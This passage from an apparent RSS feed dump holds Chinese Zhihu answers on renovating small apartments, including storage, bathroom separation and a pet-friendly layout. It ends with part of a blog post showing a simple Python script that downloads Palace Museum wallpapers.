src=\"https://pic1.zhimg.com/v2-ed15b626d94ed14fee866c0b49da61eb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"624\" data-rawheight=\"890\" data-watermark=\"watermark\" data-original-src=\"v2-ed15b626d94ed14fee866c0b49da61eb\" data-watermark-src=\"v2-60ce835fa6a21549d6e81486c846090f\" data-private-watermark-src=\"v2-26d405e10fed996af7252b8c1b359a2c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-fcc94f9aef0217255eab795c8782b3c7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"887\" data-watermark=\"watermark\" data-original-src=\"v2-fcc94f9aef0217255eab795c8782b3c7\" data-watermark-src=\"v2-a5cd9563eaf4d311bd818a4c012ca925\" data-private-watermark-src=\"v2-279124f81dab237441514371f26e2a49\"></p>\n<p><br></p>\n<p>对于多人口来说，改造卫浴空间设计显得格外重要，合理的设计，让沐浴、洗漱、如厕各居一地，避免家庭成员引发清晨<b>“冲突”。</b></p>\n<p><b>马桶上侧的收纳柜，足以放下一家人的洗漱用品，通长台下盆的设计更易打理，节省空间外，同时节省更珍贵的时间。</b></p>\n<p>房间虽小，五脏俱全，家人的入住赋予其盎然的生机，而设计师合理的设计，正好裁剪其多余的蓬勃欲，使它精而细，小却美，简单不失安逸。</p>\n<p>房间虽小，温暖满溢，分置得当，照顾好每一位亲爱的家人，生活才会更加美好。</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/331434969/answer/2072861246?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">354 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/340885904?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问去哪里、跟谁学习系统的整理收纳师课程比较靠谱？</a><br><a href=\"http://www.zhihu.com/question/336529331?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">可以把你们的桌面发给我看吗？想学学如何收纳?</a><br>\n","link":"http://www.zhihu.com/question/331434969/answer/2072861246?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"长条小户型怎么合理装修布局？","date":"2021-09-09 11:21:59","description":"\n<p>北京57平长条小户型爆改案例，希望可以带给你一些灵感！</p>\n<p>【设计需求】：<br>①主卧希望改成集客厅、起居室、观影区、办公区、储物间为一体的多功能房；<br>②厨房希望是开放式的，同时兼具餐厅功能；<br>③次卧需要满足女儿未来10年的居住需求，要有学习必备基础设施摆放空间；<br>④需要设计一组上下床，解决老人临时居住问题；<br>⑤男主对灯光方面要求高，希望光源设计更细腻;<br>⑥对储物空间需求比较大，尽量为隐藏式；<br>⑦卫生间布局不合理，希望设计成日式三分离；<br>⑧要布置小型佛龛，预留空间不需要很大，注意不要对着主卧的床位；<br>⑨男主对睡眠环境要求高，需要用抗噪和环保性材料；</p>\n<p>【设计亮点】：</p>\n<p>①墙板缝隙之间安装了灯带，满足灯光照明需求；</p>\n<p>②柜体的设计满足床头东西收纳功能；</p>\n<p>③设专区，可供佛，干净整洁；</p>\n<p>④入户鞋柜解决回家换鞋及收纳功能，开放格方便归置小物；</p>\n<p>⑤玻璃隔断使得白天采光充足空间通透，视觉上空间通透明亮不拥挤；</p>\n<p>⑥层板的设计满足投影仪与体感游戏机等设备放置；</p>\n<p>⑦土间放置衣架，经济实惠，增加收纳；</p>\n<p>⑧淋浴间使用磨砂背漆玻璃门，防水性好并且隐私性高。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e2190ad84b26f2ed3b2ef06b1971f5e0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"341\" data-watermark=\"watermark\" data-original-src=\"v2-e2190ad84b26f2ed3b2ef06b1971f5e0\" data-watermark-src=\"v2-3437c1b08afc909ec3b1b063eb610ea6\" data-private-watermark-src=\"v2-a706be4d5377624f6e6eb4ccbd397302\"></p>\n<p>户型图</p>\n<p><img src=\"https://pic3.zhimg.com/v2-055457f55b7d08300eb09948f998f38e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"324\" data-watermark=\"watermark\" data-original-src=\"v2-055457f55b7d08300eb09948f998f38e\" data-watermark-src=\"v2-eab8d3b362222975e35064b4198256ef\" data-private-watermark-src=\"v2-402e6e4d43dff6e9de1df471a6bae0dc\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b0a5f0231472525842dee76f702b08a7_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"270\" data-watermark=\"watermark\" data-original-src=\"v2-b0a5f0231472525842dee76f702b08a7\" data-watermark-src=\"v2-3fe42286d33a55da31d54cfe3c0b2f13\" data-private-watermark-src=\"v2-6e3e9d26baf92bd1fe7afce073b4993f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3d051ddafc1da90c044adbe838f3c77f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"547\" data-watermark=\"watermark\" data-original-src=\"v2-3d051ddafc1da90c044adbe838f3c77f\" data-watermark-src=\"v2-8131c1b052cab4f79108afa4dfcdf60b\" data-private-watermark-src=\"v2-046625d5d5346866b44be012c5eb99f1\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d09e8f81399a96f2d58154aed6cfa157_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-d09e8f81399a96f2d58154aed6cfa157\" data-watermark-src=\"v2-7c3c36500d6ca7085a5b0f43e94b3ec3\" data-private-watermark-src=\"v2-81586c112667e6aa9bc33034f8b9e19a\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/367327021/answer/2087469045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/383323077?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型如何装修 尤其是客厅?</a><br><a href=\"http://www.zhihu.com/question/348943705?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型怎么设计啊 客厅太小了？</a><br>\n","link":"http://www.zhihu.com/question/367327021/answer/2087469045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"小户型房子如何装修看起来不廉价？","date":"2021-09-09 11:21:41","description":"\n<p>实用和好看，收纳和色彩搭配。可以看看这套案例，能不能给你一些灵感，72平两居（常住两个大人+三个毛孩儿）的改造案例。</p>\n<p>对于这个案例的改造，屋主希望在视觉不太拥挤的前提下拥有更多的储物空间，三只毛孩儿的玩耍空间也尽量宽敞，客厅满足看电影和放松休闲，卧室只需做好隔音隔光，保证良好的睡眠即可，整个新家显得更现代，更宽敞简洁。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d87eda51f1095d812d35f8bb79023643_720w.jpg?rss\" data-caption=\"原始户型平面图vs改造后平面图\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"619\" data-watermark=\"watermark\" data-original-src=\"v2-d87eda51f1095d812d35f8bb79023643\" data-watermark-src=\"v2-8fc559bc420fa181c42b6405f33ec670\" data-private-watermark-src=\"v2-250b3f348e4e9fdaacbbd27056c9479a\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-deb91789b973dd7cf95b370584694f04_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"619\" data-watermark=\"watermark\" data-original-src=\"v2-deb91789b973dd7cf95b370584694f04\" data-watermark-src=\"v2-02af337c968911ae57c2b259a10b8ffb\" data-private-watermark-src=\"v2-f59aa8c24d9e8d4c59339a3e539b67a1\"></p>\n<p><b>- 原始户型 -</b></p>\n<p>• 玄关面积较小，储存空间不到位；</p>\n<p>• 客厅杂物等没有足够空间储存，也没有展示区；</p>\n<p>• 原空间动线单一，公共区域面积较小，三只狗狗的活动空间太拥挤；</p>\n<p>• 狗狗平时得在马桶上进行日常擦洗，没有专用的清洗空间；</p>\n<p>• 卫生间为暗卫，采光不好。</p>\n<p><br></p>\n<p><b> - 改造亮点 - </b></p>\n<p>• 玄关两面墙都做了收纳柜，搭配洞洞板，有效提升储物功能；</p>\n<p>• 打通次卧并入客厅，改造成多功能室，公共空间变开阔；</p>\n<p>• 室内动线变流畅，空间更通透；</p>\n<p>• 全屋细节收纳，可最大限度上保持视觉简洁；</p>\n<p>• 卫生间三分离处理，暗卫变明卫。并增加狗狗擦洗专用折叠桌板，使用方便。</p>\n<p><br></p>\n<p><b>打造极致收纳 </b></p>\n<p>玄关 | 隐形柜+置物洞洞板</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0fcb81a18047dcd6b3ee1b0d5446f7f6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1495\" data-watermark=\"watermark\" data-original-src=\"v2-0fcb81a18047dcd6b3ee1b0d5446f7f6\" data-watermark-src=\"v2-923df93d6f6c95ddeeb7ad7b951a50f8\" data-private-watermark-src=\"v2-4a34216e18468d406a0eaa2b84bff48f\"></p>\n<p>玄关作为进入室内的第一站，也是打造收纳的重要区域，原始户型没有在这里做任何规划，造成了极大的浪费，改造后，一侧做了整墙的隐形柜体设计，依次可储存鞋子和狗狗常用的物品，另一侧规划了超大穿衣镜与整面洞洞板，不光方便了收纳，目之所及，更是显得干净整洁。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bd1c3fb4859856816d30dd749af2d2df_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-bd1c3fb4859856816d30dd749af2d2df\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-db5249ad8ed2d33ebc9a540c6e34df3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-db5249ad8ed2d33ebc9a540c6e34df3b\" data-watermark-src=\"v2-2416f451947ad99de269d325e72f17ad\" data-private-watermark-src=\"v2-88c21a19f01d190ccc965b3049097e4b\"></p>\n<p>穿衣镜后方内嵌灯带，轻松辅助空间照明，而且洞洞板下方安装了折叠换鞋凳，方便进出换鞋，不用时可直接收起，节约空间。</p>\n<p><b>动线更优 客餐厅一体化 </b></p>\n<p>客厅+餐厅</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5a8cffecd13cc34f975645acaafe6070_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"727\" data-watermark=\"watermark\" data-original-src=\"v2-5a8cffecd13cc34f975645acaafe6070\" data-watermark-src=\"v2-aa7b0c42755e6ef1b0b3115a343e9c0f\" data-private-watermark-src=\"v2-dede2f32aa887b1657d4b86e1b930478\"></p>\n<p>客厅陈设较为简单，以大面积的白色和木质色调为基调，再以局部的灰色点缀，内敛简洁。考虑到毛孩子需要无障碍的空间进行活动，所以客厅没有采用传统的茶几，而是用一把轻盈的边几用来辅助置物需求，随用随挪。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac7a2777ab4d8210631b522c4fb1f0d6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"726\" data-watermark=\"watermark\" data-original-src=\"v2-ac7a2777ab4d8210631b522c4fb1f0d6\" data-watermark-src=\"v2-cd36db43a5b049c98c6bc0bf5f548a3f\" data-private-watermark-src=\"v2-99187c13323f7c560d07da07d78c70f5\"></p>\n<p>客厅的立面空间也不能浪费，整个墙面延伸了玄关柜体的风格，大面积的白色铺陈，简洁大方，尽头设圆弧型开放格，可做展示架使用，视觉上比锐利的直角造型柜更柔和，并且下方正好归置扫地机器人。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f166676cf8dd9aafccbbf9a3ec90933f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"652\" data-watermark=\"watermark\" data-original-src=\"v2-f166676cf8dd9aafccbbf9a3ec90933f\" data-watermark-src=\"v2-93c44d22ef84870f8e234f95eef70c7a\" data-private-watermark-src=\"v2-89960a1462ba4dfa7092d10d228be6f6\"></p>\n<p>沙发正对面的白墙没有放电视，而是打造了绝佳的观影区域，大面积的幕布投放毫无压力，结合后方的灯带环境，营造出了错落有致的层次感。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-30a1eaa78947cfd8b194f28f70428a22_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1524\" data-watermark=\"watermark\" data-original-src=\"v2-30a1eaa78947cfd8b194f28f70428a22\" data-watermark-src=\"v2-4c684b0027e543feb7eb07bcb85b50fc\" data-private-watermark-src=\"v2-a2b036959e9b88765b6be03efc28b0a4\"></p>\n<p>沙发另一侧是一个小小的飘窗区，可用作临时的休憩之地，一杯咖啡+一本好书，能让人在此安静享受整个下午。</p>\n<p><b>优化采光  补充公共区域 </b></p>\n<p>多功能室 + 榻榻米</p>\n<p><img src=\"https://pic4.zhimg.com/v2-15c8d982b8adf55ac23e5097767088c6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-15c8d982b8adf55ac23e5097767088c6\" data-watermark-src=\"v2-54468d0f44f69df480a2202b783e08fe\" data-private-watermark-src=\"v2-99e218c4d42875a804137f2624075b30\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c9372b21470b652becc2eda5eb62b60f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"670\" data-watermark=\"watermark\" data-original-src=\"v2-c9372b21470b652becc2eda5eb62b60f\" data-watermark-src=\"v2-ccadc5d3651df08f48c7d8ed1a09847e\" data-private-watermark-src=\"v2-2ead6966782500def675bee7e4a7f3be\"></p>\n<p>打通壁垒后的墙面更加连贯开阔，想要使家里的储存空间最大化地利用，又不过于杂乱，最好的办法是因地制宜做定制储物柜，于是利用立面空间分别部署了工作区、展示柜与水吧台，空间属性也因此变得丰富起来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e71772a859ee7b11d392169581e1b88_720w.gif?rss\" data-caption=\"△展示柜与水吧台之间做了一面抽拉式收纳架平时可以存放零食饮料，供随时取用\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-2e71772a859ee7b11d392169581e1b88\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了最大化释放空间，尽可能地给毛孩子们创造更开阔的活动区域，拆除了次卧与客厅的隔墙，原本的次卧位置被改造成了多功能室，整屋南北方向更加通透，居住感受变得更加舒适。水吧台的位置可以放一些小家电，例如咖啡机、豆浆机、早餐机等，墙面装了滑轨插座，颜值在线，并可满足多台电器同时使用。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-dcfb4ac8b39bd21be7b6c0858e9f22be_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-dcfb4ac8b39bd21be7b6c0858e9f22be\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>多功能区靠近窗户的位置，打造了一个榻榻米床，而且为了取用方便，下方做的是3个拉屉的设计，两边的柜子的的收纳储量也很大，大件不常用的物品整理好储放到柜门里，既美观又实用。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e4d2b9cf5f660d096687c6e754f9414_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1233\" data-watermark=\"watermark\" data-original-src=\"v2-1e4d2b9cf5f660d096687c6e754f9414\" data-watermark-src=\"v2-ef37fd7e6213fb95c84c757a9e6f6c9f\" data-private-watermark-src=\"v2-7708a332640c14bb59f6991c58e3b272\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-960e89d8cd996c3c49402ff66ec20242_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-960e89d8cd996c3c49402ff66ec20242\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>双排操作台  省时又省力</b></p>\n<p>厨房+小阳台</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3f1220a423436709d8f803f14476aaa9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1511\" data-watermark=\"watermark\" data-original-src=\"v2-3f1220a423436709d8f803f14476aaa9\" data-watermark-src=\"v2-9562976c52c2cdc061ebf13dca7180fb\" data-private-watermark-src=\"v2-334d22c323914e9df5a0bf8f65c97abe\"></p>\n<p>双一字型布局与现有的厨房条件更契合，从左到右，依次可做到洗、切、煎、炒等操作，动线流畅。厨房的一端连接小阳台，让厨房的采光更通透。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b99fa5ab93324bf69ef3fcac33967c07_720w.gif?rss\" data-caption=\"△ 灶台边的调味瓶统统放到这个伸缩架上平时不用的时候就收起来，保持台面整洁\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-b99fa5ab93324bf69ef3fcac33967c07\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>厨房的每一寸空间也得到了合理利用，上下柜体收纳充足，将厨具和大件用品按照使用方式分门别类，最大化释放了台面的操作面积。</p>\n<p><b>双侧衣橱 大量储物</b></p>\n<p>卧室+储物衣柜<br></p>\n<p>卧室的两面墙都做了衣柜，进门的地面做了抬高处理，床内嵌于地台之中，整体简洁有序，也增加了卧室的空间层次感。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d16dd08d2de46f3a5ed43468d90b68f6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"743\" data-watermark=\"watermark\" data-original-src=\"v2-d16dd08d2de46f3a5ed43468d90b68f6\" data-watermark-src=\"v2-1ddde3e19adb14d17cbdfbb587fc4f63\" data-private-watermark-src=\"v2-147bccbfdcbf46276a408c7156ac4e80\"></p>\n<p>衣柜上方是3D风口空调，一般中央空调出风口都是格栅状的，风口方向需要手动调节，而这种3D风口的舒适性就更高了，风口可以通过控制器实现上下左右调节，将气流均匀打散送至房间每个角落，并可智能监测人数位置，避开对着人直吹。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4a71515eb5ffdc2bcdee19bf734ed4e1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-4a71515eb5ffdc2bcdee19bf734ed4e1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>折叠加推拉式柜门是特别定制的，柜内还贴心地配上了感应灯，让衣物的拿取变得轻松自如。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-32124fb8c25b4ce9066253ee8e1a982e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-32124fb8c25b4ce9066253ee8e1a982e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>卧室门口正对的墙面，也做了收纳柜，左侧为挂衣区，方便进出换衣，右侧专门用来收纳当季正在穿的鞋子。</p>\n<p><b>三式分离  暗卫变明卫</b></p>\n<p>卫生间 + 折叠板</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fa05ba9fa7e9ab041ac940284f3cbef6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1492\" data-watermark=\"watermark\" data-original-src=\"v2-fa05ba9fa7e9ab041ac940284f3cbef6\" data-watermark-src=\"v2-3ce97ae0472e3b2cb93e081ffb580a6d\" data-private-watermark-src=\"v2-6dac44450300a9e7b86344a0dcc9da38\"></p>\n<p>原户型的卫生间是暗卫，白天进去必须开灯；改造后，将洗手台从卫生间“释放”出来，不仅真正实现了干湿分离，还优化了日常需求动线，有效提高了空间利用率。原卫生间为普通平开门，使用面积狭窄，改造后使用折叠门，灵活实现空间的分隔和独立。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9aa25ba42b46245eb65131b4b15d8cf6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-9aa25ba42b46245eb65131b4b15d8cf6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-223efc55f3f64314d4a649f54624bd50_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-223efc55f3f64314d4a649f54624bd50\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>卫生间最大的改造亮点便是这个折叠桌板了，现在可以直接在这个专区上清理狗狗身上的污垢。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2d2b03646366e4edec78686236225442_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-2d2b03646366e4edec78686236225442\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>洗手台左侧的淋浴区，墙面材质为仿水泥砖，质感高级，花洒旁边设置壁龛，正好可收纳洗漱用品，并且采用了电动雾化玻璃作为与客厅的隔断，既解决了原本暗卫采光不便的难题，又能很好地保护隐私。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-28d0ffe2c8b8a32e5c6c8ecdfcce97de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"820\" data-watermark=\"watermark\" data-original-src=\"v2-28d0ffe2c8b8a32e5c6c8ecdfcce97de\" data-watermark-src=\"v2-853050377e39bf9b2677411243b1afd6\" data-private-watermark-src=\"v2-e4c29711c683cdb748dfc446c3d8f1a8\"></p>\n<p>最后，此案例的一些设计亮点和收纳思路，可供做为鉴赏，然后进行取舍。预算有限的情况下，我给你几条个人建议：</p>\n<p>第一条：比如全屋定制 地板 涂料等大面积铺的品类，可以选择稍微好一些的品牌（牵扯到甲醛等环境问题），像一些小件主材，可以选择购买便宜且实用的品牌。</p>\n<p>第二条：可以去宜家淘一些卖的比较火的小件家具。（宜家冰激淋可以尝尝看）</p>\n<p>第三条：多购买一些小家电，如三明治机 榨汁机等等，在家多做点饭，而不是要外卖，更可以提升生活情调或者是品质。</p>\n<p>第四条：投影和百叶窗用的得当，可以最大程度提升整体居家生活氛围。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/338558347/answer/2099093481?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">189 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/311450649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型两室一厅57平怎么装修？</a><br><a href=\"http://www.zhihu.com/question/346429351?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">50平小户型要怎么装修成三室一厅？</a><br>\n","link":"http://www.zhihu.com/question/338558347/answer/2099093481?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span 